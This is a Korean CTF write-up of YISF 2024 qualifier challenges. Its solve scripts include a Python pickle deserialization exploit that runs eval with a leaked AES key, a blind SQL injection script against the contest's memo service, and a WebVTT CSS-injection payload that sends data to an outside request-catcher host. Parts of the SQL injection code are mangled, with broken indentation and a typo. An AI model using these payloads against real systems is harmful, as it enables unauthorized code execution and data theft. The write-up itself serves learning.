---
title: yisf-quals-writeup
published: 2024-10-16
description: "yisf quals + upsolving"
image: ""
tags: [yisf, writeup]
category: "writeup"
draft: false
lang: "ko"
---

# Solved

## Flaggcut

```python
# chall.py
assert len(flag := open('flag', 'rb').read()) == 28
assert (mod := int(input())) < 200
print(int.from_bytes(flag, 'big') % mod)
```

위와 같은 간단한 코드가 주어진다.
**CRT**가 인텐이지만 **음수**를 넣는 언인텐으로 풀이할 수 있다.

```python
# solve.py
from pwn import *
from Crypto.Util.number import long_to_bytes
r = remote("211.229.232.101", 22111)

r.sendline('-1'+'0'*80)
data = r.recvline().decode()
print(long_to_bytes(10**80+int(data)))

# YISF{cutcutcut_flagflagfalg}
```

## PhoneTICgrief

변형된 포네틱 코드이다.
포네틱 코드를 두번 돌려 디코딩 할 수 있다.
(다만 L은 Linux로 치환해야 한다.)

```python
table = {
    "A": "Alfa", "B": "Bravo", "C": "Charlie", "D": "Delta", "E": "Echo",
    "F": "Foxtrot", "G": "Golf", "H": "Hotel", "I": "India", "J": "Juliett",
    "K": "Kilo", "L": "Linux", "M": "Mike", "N": "November", "O": "Oscar",
    "P": "Papa", "Q": "Quebec", "R": "Romeo", "S": "Sierra", "T": "Tango",
    "U": "Uniform", "V": "Victor", "W": "Whiskey", "X": "Xray", "Y": "Yankee",
    "Z": "Zulu"
}

# YISF{remember_my_birthday}
```

## take_your_flag

**ROL**을 역산해주고, 안티 리버싱만 잘 보면 된다.

```python
fake = bytes.fromhex('99 85 AD 95 7D B1 BD D9 95 7D 99 85 AD 95 7D B1 BD D9 95 7D 99 85 AD 95 7D B1 BD D9 95')
flag = ''
dword_4020 = [
    0xC4, 0x95, 0x83, 0xC4, 0x7D, 0x99, 0xC4, 0xD0, 0x9D, 0x7D, 0xD4, 0xA5,
    0xC4, 0xCD, 0x7D, 0xC4, 0xCD, 0xB2, 0xE5, 0x7D, 0xA4, 0xBD, 0xAD, 0x95,
    0x7D, 0xA8, 0xD0, 0xA1, 0xD0, 0x7D, 0xD3, 0xD0, 0xAD, 0xC8, 0x7D, 0x99,
    0xC4, 0x85, 0x9D
]

dword_4020[0] += 5
dword_4020[2] += 2
dword_4020[10] -= 3
dword_4020[11] -= 4
dword_4020[17] += 3
dword_4020[20] += 5
dword_4020[25] -= 7
dword_4020[30] -= 2
for c in dword_4020:
    flag += chr(((c>>2) | ((c<<6)& 0xFF)) & 0xFF)

print('YISF{'+flag+'}')

# YISF{rea1_f14g_th1s_1smy_joke_h4h4_t4k2_f1ag}
```

## webcome

python의 pickle모듈에서 발생하는 deserialization 취약점이다.

`object.__reduce__` 메소드는 unpickling할 때 어떻게 객체를 재구성할지에 관한 명령 피연사자와 명령어를 포함한다.

```python
def __reduce__():
    return ((callable_method), (args))
```

os.system으로는 반환값을 받기가 어려워서 eval을 사용하거나 리버스쉘을 열면 된다.

`AES_KEY`는 `X-AES-KEY` 헤더를 통해 유출된다.

리눅스에서 코드를 짜서 그대로 보내주면 된다.

```python
# Linux, Ubuntu 22.04.5 LTS
import pickle, base64
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad


AES_KEY = "36f6d9a966c4478c73af4fde2f813212"

def encrypt(data):
    cipher = AES.new(AES_KEY.encode(), AES.MODE_ECB)
    return cipher.encrypt(pad(data, AES.block_size))

class exploit():
    def __reduce__(self):
        return (eval,("open('/usr/src/app/flag.txt').read()",))

payload = base64.b64encode(encrypt(pickle.dumps({"name":exploit(),"userid":"","password":""}))).decode('utf8')
print(payload)

# YISF{webCOme_T0_7He_h4CK1ng__wEBCOM3}
```

## My Memo Service

재밌는 SQL Injection 문제였다.

```python
# dist/routes/memo.py
@writeBP.get('/viewer')
def memoView():
    memoId = request.args.to_dict()

    if 'mid' not in memoId or 'uid' not in memoId:
        return redirect(url_for('error', msg="올바르지 않은 메모글을 보려고 합니다.", returnUrl="/"))

    if re.match(r'^[0-9a-fA-F]{8}\b-[0-9a-fA-F]{4}\b-[0-9a-fA-F]{4}\b-[0-9a-fA-F]{4}\b-[0-9a-fA-F]{12}$', memoId['mid']) is None or re.match(r'^[0-9a-fA-F]{8}\b-[0-9a-fA-F]{4}\b-[0-9a-fA-F]{4}\b-[0-9a-fA-F]{4}\b-[0-9a-fA-F]{12}$', memoId['uid']) is None:
        return redirect(url_for('error', msg="올바르지 않은 메모글을 보려고 합니다.", returnUrl="/"))

    result = memoListRepository.get_memo(memoId, session['uid'])
```

`memoId`를 request.args.to_dict()로 전부 넣어준다.

get_memo에서는 단지 mid, uid로 시작하는 문자열은 sql쿼리 문에 넣어주는데 여기서 **Blind SQL Injection**이 발생한다.

```python
# dist/libs/repository/MemoList.py
try:
    # check memo exist and notice memo
    # !!!!! 취약함
    with self.__dbSess.cursor() as cursor:
        cursor.execute(f"SELECT `mid`, `uid` FROM `{self.__MEMO_TABLE_NAME}` WHERE " + " AND ".join(f"`{k}`='{escape(v)}'" for k, v in memoData.items() if k.startswith('mid') or k.startswith('uid')) + " LIMIT 1")
        _tmpQueryResult = cursor.fetchone()

    if not _tmpQueryResult:
        raise Exception('No data found')

    if escape(memoDataMid) != _tmpQueryResult[0] or escape(memoDataUid) != _tmpQueryResult[1]:
        raise Exception('not allowed to view this memo')

    # get memo & no memo Exception('not allowed to view this memo') - 생략
```

v에 대해서는 escape를 실행해주지만 k는 그냥 값을 넘겨준다.

sql문들을 살펴보면 나의 notice_id는 무조건 1이고, 공지는 2, 플래그는 3이므로 페이로드를 잘 작성해주면 된다.

<details>
<summary><i>Exploit</i></summary>

```python
# ex.py
import requests
from urllib.parse import quote, urlparse, parse_qs
import string
from bs4 import BeautifulSoup

url = "http://211.229.232.100:48410"
# url = "http://localhost:48410"

r = requests.session()

def register():
    global r
    res = r.post(f"{url}/account/register", data={"name":"guest","email":"guest@guest.guest","password":"guest"}) # print(res.text)
def login():
    global r
    res = r.post(f"{url}/account/login", data={"name":"guest","password":"guest"}) # print(res.text)
mid = '' # 내 게시글 mid
uid = '' # 내 게시글 uid'

register()
login()

flag_mid = '' # 85f70661-83fe-447b-aad5-3db71431174f
flag_uid = '' # 4e5f6a7b-8c9d-0123-ef45-6789abcdef01
flag = 'MY_SECRET_IS_YISF{'

# ab2a67ed7217d50bb048bc312bb47921f7b087cc894cfa34caf1e8cef883ef0a}...?

for i in range(32):
    if i in [8, 12, 16, 20]:
    flag_mid += '-'
    for c in string.hexdigits:
    payload = f"mid`=`mid`OR`mid`like '{flag_mid+c}%' AND`is_notice`!=2 AND `is_notice`!=1 order by is_notice DESC;#"

            res = r.get(f'{url}/memo/viewer?mid={mid}&uid={uid}&{quote(payload)}=1')
            soup = BeautifulSoup(res.text, 'html.parser')
            cards = soup.find_all('div', {'class':'col'})
            if cards:
                pass
            else:
                print('!!', flag_mid+c)
                flag_mid += c
                break

for i in range(32):
    if i in [8, 12, 16, 20]:
    flag_uid += '-'
    for c in string.hexdigits:
    payload = f"mid`=`mid`OR`mid`='{flag_mid}' AND `uid` like '{flag_uid+c}%' order by is_notice DESC;#"

            res = r.get(f'{url}/memo/viewer?mid={mid}&uid={uid}&{quote(payload)}=1')
            soup = BeautifulSoup(res.text, 'html.parser')
            cards = soup.find_all('div', {'class':'col'})
            if cards:
                pass
            else:
                print('!!', flag_uid+c)
                flag_uid += c
                break

for i in range(200):
    for idx, c in enumerate(string.ascii*letters+string.digits+r"""!$&()\*+,-./:;<=>?@[\]^`{|}~*"""):
    payload = f"mid`=`mid`OR`mid`='{flag_mid}' AND `uid`='{flag_uid}' AND `content` like BINARY('{flag+c}%') order by is_notice DESC;#"

    res = r.get(f'{url}/memo/viewer?mid={mid}&uid={uid}&{quote(payload)}=1')
    soup = BeautifulSoup(res.text, 'html.parser')
    cards = soup.find_all('div', {'class':'col'})
    if cards:
        pass
    else:
        print('!!', flag+c)
        flag += c
        break

# YISF{ab2a67ed7217d50bb048bc312bb47921f7b087cc894cfa34caf1e8cef883ef0a}

```

</details>

---

# Upsolving

## ViroFluX

**is07ing**선배의 풀이를 보고 공부했다.
[Link](https://blog.is07king.kr/posts/2024_YISF_Qual_Writeup/#2-viroflux)

**Unity Game**을 리버싱하는 문제가 주어진다.

`dnspy`, `cheat engine`을 게임 해킹에서 활용할 수 있다.

[Download Link](https://github.com/dnSpy/dnSpy/releases)

```
1. ./[GAME_NAME]_Data/Managed/Assembly-CSharp.dll를 dnspy에서 열어주면서 Target 체크 루틴과 점수 체크 루틴을 지워주고 실행만 하게 하면 된다.

2. base.gameObject.SetActive(false);로 봇의 부활을 막아준다.

3. 데미지도 높여준 후 Key를 먹고, Flag Portal을 타고 들어가면 플래그를 얻을 수 있다.
```

`YISF{v4Cc1N3s_AtC_CoDe_J07bB}`

## cinema

```py
import requests
from urllib.parse import quote
import clipboard

track_url = f"/review?text="+quote('''WEBVTT
00:00.000-->00:30.000
<v>''')

payload = f'''<track default kind="captions" src="{quote(track_url)}" >
<style>
::cue(v)[value^=1] {'''{
    background: url('https://rfbxspa.request.dreamhack.games');
}'''}
</style>'''
clipboard.copy(payload.replace('\n',' '))
```

클라이언트에서 DOMPurify를 사용해 xss를 필터링하는데 WebVTT API라는 것을 사용하여 CSS Injection을 일으킨다.
상당한 ptsd가 있어서 라업은 안 쓴다.
(참고로 Nivy Service는 아예 DOMPurify 1-day문제였다.)

[드림핵](https://dreamhack.io/wargame/challenges/1380)에 포팅되어서 풀이하였다.

[WebVTT API](https://developer.mozilla.org/en-US/docs/Web/API/WebVTT_API)
